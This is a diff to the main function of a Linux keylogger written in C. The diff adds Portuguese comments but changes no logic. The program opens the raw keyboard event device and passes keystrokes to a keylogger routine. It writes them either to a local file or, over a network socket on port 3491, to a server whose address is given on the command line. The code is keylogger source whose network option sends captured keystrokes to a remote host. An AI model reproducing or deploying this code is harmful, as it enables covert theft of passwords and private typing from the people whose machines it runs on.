@@ -10,22 +10,22 @@
 
 #define PORT "3491"
 
-void print_usage_and_quit(char *application_name);
+void print_usage_and_quit(char *application_name); // mensagem padrão para caso de erro
 
 int main(int argc, char *argv[])
 {
-  char *KEYBOARD_DEVICE = get_keyboard_event_file();
+  char *KEYBOARD_DEVICE = get_keyboard_event_file(); // obtendo arquivo do teclado
   if (!KEYBOARD_DEVICE)
   {
     print_usage_and_quit(argv[0]);
   }
 
-  int writeout;
-  int keyboard;
+  int writeout; // file descriptor do socket do servidor
+  int keyboard; // file descriptor do teclado
 
   int network = 0, file = 0, option = 0;
   char *option_input;
-  while ((option = getopt(argc, argv, "sn:f:")) != -1)
+  while ((option = getopt(argc, argv, "sn:f:")) != -1) // entrada pela linha de comando
   {
     switch (option)
     {
@@ -46,12 +46,12 @@ int main(int argc, char *argv[])
     }
   }
 
-  // If both arguments or neither are provided...
+  // se os dois argumentos ou nenhum for fornecido
   if (network == file)
   {
     print_usage_and_quit(argv[0]);
   }
-  else if (file)
+  else if (file) // opção de fazer o keylogger no seu próprio pc
   {
     if ((writeout = open(option_input, O_WRONLY | O_APPEND | O_CREAT, S_IROTH)) < 0)
     {
@@ -59,7 +59,7 @@ int main(int argc, char *argv[])
       return 1;
     }
   }
-  else if (network)
+  else if (network) // opção de fazer o keylogger com um servidor
   {
     writeout = get_socket_file_descriptor(option_input, PORT);
     if (writeout < 0)
@@ -69,13 +69,13 @@ int main(int argc, char *argv[])
     }
   }
 
-  if ((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0)
+  if ((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0) // abrindo o arquivo do teclado
   {
     printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
     return 1;
   }
 
-  keylogger(keyboard, writeout);
+  keylogger(keyboard, writeout); // chama a função keylogger
 
   close(keyboard);
   close(writeout);
